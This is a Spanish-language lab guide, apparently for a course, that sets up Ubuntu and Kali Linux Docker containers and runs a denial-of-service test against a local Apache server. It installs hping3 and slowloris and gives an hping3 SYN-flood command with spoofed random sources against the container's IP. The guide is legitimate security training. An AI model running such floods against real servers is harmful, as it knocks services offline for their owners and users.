# 🚀 Configuración de Contenedores para Pruebas de Seguridad

Este documento describe cómo configurar un entorno de prueba con **Ubuntu** y **Kali Linux** en contenedores Docker para evaluar ataques de Denial of Service (DoS) sobre un servidor Apache.

---

## 🏗️ Configuración del Servidor Apache en Ubuntu

En una terminal con Docker, ejecuta los siguientes comandos para desplegar y configurar un servidor Apache dentro de un contenedor **Ubuntu**.

### 📌 1. Crear un Contenedor de Ubuntu
```bash
docker run -dit --name servidor-apache-prueba -p 80:80 ubuntu
```
🖼 **Evidencia:** Captura de la creación del contenedor en la terminal.

### 📌 2. Ejecutar la Instancia de Ubuntu
```bash
docker exec -it servidor-apache-prueba bash
```

### 📌 3. Actualizar el Sistema Ubuntu
```bash
apt update -y && apt upgrade -y
```

### 📌 4. Instalar el Servidor Apache
```bash
apt install -y apache2
```

### 📌 5. Configurar el Mensaje de Bienvenida
```bash
echo "Hola, soy un servidor con Apache Server. Si ves este mensaje, el servidor está activo." > /var/www/html/index.html
```
🖼 **Evidencia:** Captura del archivo `index.html` con el mensaje de prueba.

### 📌 6. Iniciar el Servicio Apache
```bash
service apache2 start
```
🖼 **Evidencia:** Captura del estado del servicio con `service apache2 status`.

### 📌 7. Verificar la Página Web en el Navegador
En el navegador local, ingresa la siguiente URL:
```
http://localhost:80
```
🖼 **Evidencia:** Captura del navegador mostrando el mensaje de bienvenida.

---

## 🔥 Configuración de Kali Linux para Pruebas de Ataques DoS

En otra terminal, ejecuta los siguientes comandos para desplegar un contenedor con **Kali Linux** y preparar herramientas para pruebas de carga sobre el servidor Apache.

### 📌 1. Crear un Contenedor con Kali Linux
```bash
docker run -dit --name kali-testing kalilinux/kali-rolling
```
🖼 **Evidencia:** Captura de la creación del contenedor en la terminal.

### 📌 2. Ejecutar la Instancia de Kali Linux
```bash
docker exec -it kali-testing bash
```

### 📌 3. Actualizar el Sistema Kali
```bash
apt update -y && apt upgrade -y
```

### 📌 4. Instalar Herramientas de Pruebas de Carga (Apache Benchmark, Hping3, Slowloris)
```bash
apt install -y hping3 slowloris apache2-utils
```
🖼 **Evidencia:** Captura de la instalación de paquetes.

---

## 🚨 Iniciando el Ataque DoS al Servidor Apache

A continuación, se ejecutará un ataque de inundación TCP aleatoria contra la IP y el puerto 80 del servidor Apache.

### 📌 1. Identificar la IP del Contenedor Ubuntu
Desde la instancia de Ubuntu, ejecuta:
```bash
ip a
```
🖼 **Evidencia:** Captura de la IP del contenedor Ubuntu.

### 📌 2. Ejecutar Ataque de Inundación TCP con **Hping3**
```bash
hping3 -S --flood --rand-source -p 80 172.17.0.2
```
🖼 **Evidencia:** Captura de la ejecución del ataque y del consumo de recursos en el servidor.

---

## 🎯 Conclusión

Después de realizar las pruebas, se puede analizar el impacto de los ataques en el servidor Apache. Se recomienda monitorear el uso de CPU y memoria del contenedor Ubuntu para evaluar el nivel de afectación.

🖼 **Evidencia:** Captura del consumo de recursos antes y después del ataque.

⚠️ **Nota:** Este documento es únicamente con fines educativos. No se debe realizar ningún ataque fuera de un entorno controlado y autorizado.
